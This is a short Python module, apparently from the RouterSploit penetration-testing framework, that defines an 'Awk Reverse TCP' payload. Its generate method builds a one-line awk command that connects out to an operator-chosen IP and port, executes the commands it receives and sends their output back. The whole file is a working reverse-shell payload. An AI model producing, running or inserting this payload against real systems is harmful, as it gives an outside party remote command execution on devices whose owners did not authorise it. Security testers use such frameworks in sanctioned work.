from routersploit import (
    exploits,
    payloads,
    validators
)


class Exploit(payloads.Payload):
    __info__ = {
        'name': 'Awk Reverse TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }

    architecture = "generic"
    lhost = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
    lport = exploits.Option(5555, 'Reverse TCP Port', validators=validators.integer)
    awk_binary = exploits.Option('awk', 'Awk binary')

    def generate(self):
        return (self.awk_binary + " 'BEGIN{s=\"/inet/tcp/0/" + self.lhost + "/" + str(self.lport) + "\";"
                "for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};'")

